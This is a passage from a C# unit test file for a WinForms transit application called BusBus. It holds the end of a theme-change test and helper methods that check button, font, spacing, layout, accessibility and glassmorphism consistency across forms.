            Assert.IsTrue(responsiveResults.Any(r => r.Contains("Rapid theme change") && r.Contains("PASS")),
                "Rapid theme changes should be handled successfully");
            Assert.IsTrue(responsiveResults.Any(r => r.Contains("operation") && r.Contains("PASS")),
                "Theme changes during operations should succeed");

            var rapidChangeCount = responsiveResults
                .Where(r => r.Contains("Rapid theme changes handled:"))
                .Select(r => int.Parse(r.Split(':')[1].Split('/')[0].Trim()))
                .FirstOrDefault();

            Assert.IsTrue(rapidChangeCount >= 7, $"Should handle at least 7/10 rapid theme changes, got {rapidChangeCount}");
        }

        #endregion

        #region Helper Methods for UI Consistency Testing

        private Control? CreateFormInstance(Type formType)
        {
            try
            {
                if (formType == typeof(BusBus.UI.Dashboard))
                {
                    var routeService = _serviceProvider?.GetService<IRouteService>();
                    var logger = _serviceProvider?.GetService<ILogger<BusBus.UI.Dashboard>>();
                    return new BusBus.UI.Dashboard(_serviceProvider!, routeService!, logger!);
                }
                else if (formType == typeof(BusBus.UI.Forms.TransportFormView))
                {
                    // Create with required service provider parameter - returns UserControl, not Form
                    var transportView = new BusBus.UI.Forms.TransportFormView(_serviceProvider!);

                    // Wrap in a form for testing purposes
                    var form = new Form();
                    form.Controls.Add(transportView);
                    transportView.Dock = DockStyle.Fill;
                    form.Size = new Size(800, 600);
                    form.Text = "Transport Form Test";
                    return form;
                }

                // Generic creation attempt
                return Activator.CreateInstance(formType) as Control;
            }
            catch (Exception ex)
            {
                TestContext?.WriteLine($"Failed to create form instance of {formType.Name}: {ex.Message}");
                return null;
            }
        }

        private string VerifyThemeApplication(Form form, string themeName)
        {
            try
            {
                // Check if form background color matches expected theme
                var backgroundColor = form.BackColor;
                var expectedDark = themeName.Contains("Dark");
                var expectedLight = themeName.Contains("Light");

                bool colorMatches = false;
                if (expectedDark && (backgroundColor.R < 50 && backgroundColor.G < 50 && backgroundColor.B < 50))
                {
                    colorMatches = true;
                }
                else if (expectedLight && (backgroundColor.R > 200 || backgroundColor.G > 200 || backgroundColor.B > 200))
                {
                    colorMatches = true;
                }
                else if (themeName.Contains("Accessible"))
                {
                    // Accessible themes may have various color schemes

                    colorMatches = true;
                }

                // Check if theme-related properties are set
                var hasThemeProperties = form.Tag?.ToString()?.Contains("Theme") == true ||
                                       form.GetType().GetProperties().Any(p => p.Name.Contains("Theme"));

                return (colorMatches && hasThemeProperties) ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyButtonConsistency(Form form)
        {
            try
            {
                var buttons = GetAllControls<Button>(form).ToList();
                if (buttons.Count < 2) return "PASS - Insufficient buttons for comparison";

                // Check size consistency
                var firstButtonSize = buttons[0].Size;
                var sizeConsistent = buttons.Skip(1).All(b =>
                    Math.Abs(b.Size.Width - firstButtonSize.Width) <= 10 &&
                    Math.Abs(b.Size.Height - firstButtonSize.Height) <= 10);

                // Check font consistency
                var firstButtonFont = buttons[0].Font;
                var fontConsistent = buttons.Skip(1).All(b =>
                    b.Font.Name == firstButtonFont.Name &&
                    Math.Abs(b.Font.Size - firstButtonFont.Size) <= 2);

                return (sizeConsistent && fontConsistent) ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyControlPositioning(Form form)
        {
            try
            {
                var panels = GetAllControls<Panel>(form).ToList();
                var buttons = GetAllControls<Button>(form).ToList();

                // Check if buttons are aligned consistently
                if (buttons.Count >= 2)
                {
                    var alignmentGroups = buttons.GroupBy(b => b.Top).ToList();
                    var hasHorizontalAlignment = alignmentGroups.Any(g => g.Count() > 1);

                    if (hasHorizontalAlignment) return "PASS";
                }

                // Check panel positioning consistency
                if (panels.Count >= 2)
                {
                    var margins = panels.Select(p => p.Margin.All).Distinct().Count();
                    return margins <= 2 ? "PASS" : "FAIL"; // Allow for minor variations
                }

                return "PASS - Limited controls for positioning verification";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private IEnumerable<T> GetAllControls<T>(Control container) where T : Control
        {
            foreach (Control control in container.Controls)
            {
                if (control is T typedControl)
                    yield return typedControl;

                foreach (var childControl in GetAllControls<T>(control))
                    yield return childControl;
            }
        }

        private Color GetFormBackgroundColor(Form form)
        {
            return form.BackColor;
        }

        private string IsUsingFormTemplate(Form form)
        {
            try
            {
                // Check if form inherits from HighQualityFormTemplate or has template-like properties
                var baseType = form.GetType().BaseType;
                var usesTemplate = baseType?.Name.Contains("Template") == true ||
                                 baseType?.Name.Contains("BaseForm") == true ||
                                 form.GetType().GetProperties().Any(p => p.Name.Contains("Template"));

                return usesTemplate ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyStandardLayout(Form form)
        {
            try
            {
                // Check for standard layout patterns
                var hasMainPanel = GetAllControls<Panel>(form).Any();
                var hasButtonArea = GetAllControls<Button>(form).Any();
                var hasProperSizing = form.MinimumSize.Width > 0 && form.MinimumSize.Height > 0;

                var standardElements = new[] { hasMainPanel, hasButtonArea, hasProperSizing };
                var standardCount = standardElements.Count(e => e);

                return standardCount >= 2 ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyButtonLayoutPattern(Form form)
        {
            try
            {
                var buttons = GetAllControls<Button>(form).ToList();
                if (buttons.Count == 0) return "PASS - No buttons to verify";

                // Check if buttons follow common layout patterns
                var bottomAlignedButtons = buttons.Where(b => b.Bottom > form.Height * 0.8).Count();
                var rightAlignedButtons = buttons.Where(b => b.Right > form.Width * 0.8).Count();

                // Common patterns: buttons at bottom or right side
                var followsPattern = bottomAlignedButtons > 0 || rightAlignedButtons > 0;

                return followsPattern ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyControlSpacing(Form form)
        {
            try
            {
                var controls = form.Controls.Cast<Control>().Where(c => c.Visible).ToList();
                if (controls.Count < 2) return "PASS - Insufficient controls for spacing verification";

                // Check for consistent spacing patterns
                var spacings = new List<int>();
                for (int i = 0; i < controls.Count - 1; i++)
                {
                    var spacing = Math.Abs(controls[i + 1].Top - controls[i].Bottom);
                    spacings.Add(spacing);
                }

                var distinctSpacings = spacings.Distinct().Count();
                return distinctSpacings <= 3 ? "PASS" : "FAIL"; // Allow for some variation
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyAccessibilityCompliance(Form form)
        {
            try
            {
                var controls = GetAllControls<Control>(form).ToList();

                // Check for accessibility features
                var hasTabIndex = controls.Any(c => c.TabIndex >= 0);
                var hasAccessibleName = controls.Any(c => !string.IsNullOrEmpty(c.AccessibleName));
                var hasProperContrast = true; // Simplified check

                var accessibilityFeatures = new[] { hasTabIndex, hasAccessibleName, hasProperContrast };
                var featureCount = accessibilityFeatures.Count(f => f);

                return featureCount >= 2 ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string CompareFontProperties(Form form1, Form form2)
        {
            try
            {
                var font1 = form1.Font;
                var font2 = form2.Font;

                var nameMatches = font1.Name == font2.Name;
                var sizeMatches = Math.Abs(font1.Size - font2.Size) <= 2;

                return (nameMatches && sizeMatches) ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string CompareButtonStyles(Form form1, Form form2)
        {
            try
            {
                var buttons1 = GetAllControls<Button>(form1).ToList();
                var buttons2 = GetAllControls<Button>(form2).ToList();

                if (buttons1.Count == 0 || buttons2.Count == 0)
                    return "PASS - No buttons to compare";

                var style1 = buttons1.First();
                var style2 = buttons2.First();

                var sizeMatches = Math.Abs(style1.Size.Width - style2.Size.Width) <= 20 &&
                                Math.Abs(style1.Size.Height - style2.Size.Height) <= 10;
                var fontMatches = style1.Font.Name == style2.Font.Name;

                return (sizeMatches && fontMatches) ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string CompareControlSpacing(Form form1, Form form2)
        {
            try
            {
                // Compare general spacing patterns between forms
                var controls1 = form1.Controls.Cast<Control>().Where(c => c.Visible).Count();
                var controls2 = form2.Controls.Cast<Control>().Where(c => c.Visible).Count();

                // Simple heuristic: similar number of controls suggests similar layout
                var controlCountSimilar = Math.Abs(controls1 - controls2) <= 3;

                return controlCountSimilar ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyCommonVisualElements(List<(string name, Form form)> forms)
        {
            try
            {
                var commonElementCount = 0;

                // Check for common elements across forms
                var allHaveButtons = forms.All(f => GetAllControls<Button>(f.form).Any());
                var allHavePanels = forms.All(f => GetAllControls<Panel>(f.form).Any());
                var allHaveLabels = forms.All(f => GetAllControls<Label>(f.form).Any());

                if (allHaveButtons) commonElementCount++;
                if (allHavePanels) commonElementCount++;
                if (allHaveLabels) commonElementCount++;

                return commonElementCount >= 2 ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        private string VerifyGlassmorphismConsistency(List<(string name, Form form)> forms)
        {
            try
            {
                // Check if glassmorphism effects are consistently applied
                var glassmorphismStates = forms.Select(f =>
                {
                    // Look for glassmorphism indicators
                    var hasTransparency = f.form.Opacity < 1.0;
                    var hasBlurEffect = f.form.GetType().GetProperties()
                        .Any(p => p.Name.Contains("blur", StringComparison.CurrentCultureIgnoreCase) || p.Name.Contains("glass", StringComparison.CurrentCultureIgnoreCase));

                    return hasTransparency || hasBlurEffect;
                }).ToList();

                // All forms should have consistent glassmorphism state
                var firstState = glassmorphismStates.First();
                var allConsistent = glassmorphismStates.All(state => state == firstState);

                return allConsistent ? "PASS" : "FAIL";
            }
            catch (Exception ex)
            {
                return $"FAIL - {ex.Message}";
            }
        }

        #endregion
    }
}
